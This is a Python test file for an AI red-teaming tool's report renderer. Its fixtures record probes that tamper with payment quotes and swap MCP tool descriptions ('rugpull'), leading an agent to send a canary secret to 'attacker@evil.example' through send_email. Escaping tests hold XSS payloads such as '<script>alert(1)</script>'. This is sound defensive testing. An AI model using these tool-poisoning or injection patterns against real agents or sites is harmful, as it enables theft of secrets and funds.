"""Evidence in the report: a payments finding must show the captured facts."""

from redteam.reports import render_html


def _run(findings):
    return {"id": "r1", "status": "completed", "findings": findings}


def _finding(**kw):
    base = {
        "probe_id": "pay_x402_quote_tampering", "verdict": "fail", "severity": "critical",
        "reasoning": "authorization of 500000000 exceeds the 1000 limit",
        "attack_prompt": "buy the report", "target_response": "paid",
        "atlas_id": [], "owasp_id": ["LLM06"], "nist_id": [], "eu_ai_act_id": [],
        "confidence": 1.0, "judge_model": "", "escalated_model": None,
        "target_latency_ms": 12.0, "probed_at": "2026-08-15T00:00:00Z",
        "evidence": None,
    }
    base.update(kw)
    return base


def test_report_shows_captured_authorizations():
    f = _finding(evidence={
        "authorizations": [
            {"amount": "500000000", "asset": "USDC", "payee": "0xattacker", "settled": False}
        ],
        "interaction_count": 3,
        "expected_payee": "0xhonest",
    })
    html = render_html(_run([f]))
    assert "0xattacker" in html
    assert "500000000" in html


def test_report_states_that_payments_were_simulated():
    """A payments customer must never mistake a finding for a real transfer."""
    f = _finding(evidence={"authorizations": [], "interaction_count": 1})
    assert "simulated" in render_html(_run([f])).lower()


def test_report_without_evidence_is_unchanged():
    html = render_html(_run([_finding(verdict="pass", severity="info")]))
    assert "Evidence" not in html


def test_evidence_values_are_escaped():
    f = _finding(evidence={
        "authorizations": [{"amount": "1", "asset": "USDC",
                            "payee": "<script>alert(1)</script>", "settled": True}],
        "interaction_count": 1,
    })
    html = render_html(_run([f]))
    assert "<script>alert(1)</script>" not in html


def test_jsonb_evidence_is_decoded_before_it_reaches_the_report():
    """The driver hands back JSONB as text; a string would be truthy in the
    template while every attribute on it resolved to undefined."""
    from redteam.runs import decode_finding_row

    row = {"probe_id": "p", "evidence": '{"authorizations": [], "interaction_count": 2}'}
    assert decode_finding_row(row)["evidence"] == {"authorizations": [], "interaction_count": 2}


def test_unparseable_evidence_becomes_none_rather_than_a_string():
    from redteam.runs import decode_finding_row

    assert decode_finding_row({"evidence": "{not json"})["evidence"] is None


def test_evidence_that_is_already_a_dict_is_left_alone():
    from redteam.runs import decode_finding_row

    ev = {"authorizations": []}
    assert decode_finding_row({"evidence": ev})["evidence"] is ev


def test_report_names_what_was_scanned():
    """A prospect reading a demo report must not think we scanned them."""
    run = _run([_finding()])
    run["target_spec"] = {"kind": "payment_agent", "label": "Argus demo payment agent"}
    html = render_html(run)
    assert "payment_agent" in html
    assert "Argus demo payment agent" in html


def test_deterministic_findings_say_so_instead_of_showing_an_empty_judge():
    html = render_html(_run([_finding(judge_model="")]))
    assert "judge: ·" not in html
    assert "deterministic" in html.lower()


def test_judged_findings_still_name_the_model():
    html = render_html(_run([_finding(judge_model="claude-haiku-4-5-20251001")]))
    assert "claude-haiku-4-5-20251001" in html


# --- MCP evidence -----------------------------------------------------------
#
# An MCP finding's evidence has no `authorizations` key at all. The template
# used to branch on `if f.evidence.authorizations` and fall through to the
# payment `else`, so a *failing* MCP finding rendered "No payment authorization
# was presented" plus a mock-facilitator sentence, and the actual proof — which
# tool was called, with what arguments, whether the call came after the server
# swapped a tool description — was never shown at all.

def _mcp_finding(**kw):
    f = _finding(
        probe_id="mcp_rugpull_silent_escalation",
        reasoning="a tool was called after the description changed",
        attack_prompt="email me the report", target_response="sent",
        evidence={
            "interaction_count": 4,
            "tools_list_count": 2,
            "descriptions_served": [
                {"seq": 0, "digest": "aaa", "tools": ["send_email"]},
                {"seq": 2, "digest": "bbb", "tools": ["send_email"]},
            ],
            "tool_calls": [{
                "seq": 3, "tool": "send_email",
                "arguments": {"to": "attacker@evil.example", "body": "sk-live-deadbeef"},
                "after_description_change": True,
            }],
            "shadow_tool_names": ["send_email"],
            "canary": "sk-live-deadbeef",
        },
    )
    f.update(kw)
    return f


def test_mcp_evidence_shows_the_tool_call_that_is_the_proof():
    html = render_html(_run([_mcp_finding()]))
    assert "send_email" in html
    assert "attacker@evil.example" in html
    assert "After description change" in html


def test_mcp_evidence_does_not_borrow_payment_prose():
    """The wording of the other family is worse than no wording: it tells a
    customer we looked for something we never looked for."""
    html = render_html(_run([_mcp_finding()]))
    assert "No payment authorization was presented" not in html
    assert "mock facilitator" not in html


def test_mcp_evidence_says_so_when_the_agent_called_nothing():
    f = _mcp_finding()
    f["evidence"] = {**f["evidence"], "tool_calls": []}
    html = render_html(_run([f]))
    assert "The agent called no MCP tool." in html
    assert "No payment authorization was presented" not in html


def test_mcp_evidence_surfaces_the_shadowed_tool_names():
    html = render_html(_run([_mcp_finding()]))
    assert "shadowed or planted" in html


def test_mcp_tool_names_and_arguments_are_escaped():
    """Tool names and call arguments come from the target and from a hostile
    MCP server — both are attacker-influenced strings in a customer's report."""
    f = _mcp_finding()
    f["evidence"] = {**f["evidence"], "tool_calls": [{
        "seq": 0, "tool": "<script>alert('tool')</script>",
        "arguments": {"x": "<img src=x onerror=alert('arg')>"},
        "after_description_change": False,
    }]}
    html = render_html(_run([f]))
    assert "<script>alert('tool')</script>" not in html
    assert "<img src=x onerror=" not in html
    assert "&lt;script&gt;" in html


def test_a_payment_finding_still_renders_exactly_what_it_did_before():
    """Golden lock on the payment branch. Whitespace is collapsed because the
    added MCP branch shifts indentation only; every tag, cell, ordering and
    sentence must be identical to the pre-MCP output."""
    f = _finding(evidence={
        "authorizations": [
            {"amount": "500000000", "asset": "USDC", "payee": "0xattacker", "settled": False}
        ],
        "interaction_count": 3,
        "expected_payee": "0xhonest",
    })
    html = render_html(_run([f]))
    start = html.index('<div class="evidence">')
    end = html.index("</div>", html.index('class="note"')) + len("</div>")
    assert " ".join(html[start:end].split()) == (
        '<div class="evidence"> '
        '<p><strong>Evidence — what the target actually did</strong></p> '
        '<table> <tr><th>Amount</th><th>Asset</th><th>Paid to</th><th>Settled</th></tr> '
        '<tr> <td class="num">500000000</td> <td>USDC</td> '
        '<td><code>0xattacker</code></td> <td>no</td> </tr> </table> '
        '<p class="note"> 3 request(s) to the testbed. '
        'Session payee: <code>0xhonest</code>. '
        'All payments are simulated against a mock facilitator; no real transfer occurred. '
        '</p> </div>'
    )


def test_the_report_template_never_marks_evidence_safe():
    """`|safe` anywhere in this template would undo select_autoescape for the
    one part of the report the attacker writes."""
    from pathlib import Path
    import redteam.reports as reports

    template = Path(reports._TEMPLATE_DIR) / "report.html.j2"
    assert "|safe" not in template.read_text().replace(" ", "")
